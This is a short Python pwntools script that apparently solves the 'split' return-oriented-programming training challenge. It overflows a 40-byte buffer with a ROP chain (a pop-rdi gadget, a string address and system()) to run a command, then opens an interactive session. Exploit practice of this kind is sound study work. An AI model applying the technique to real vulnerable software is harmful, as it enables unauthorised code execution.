#!/usr/bin/env python3

from pwn import *

pwn = './split'
buffer = 40

io = process(pwn)
io.recvuntil(b'> ')


SYSTEM = 0x400560
POP_RDI = 0x4007c3
SYS_PARAM = 0x601060
RET = 0x4007dc

payload = p64(POP_RDI) + p64(SYS_PARAM) + p64(RET) + p64(SYSTEM)

io.sendline(b'A'*buffer + payload)
io.interactive()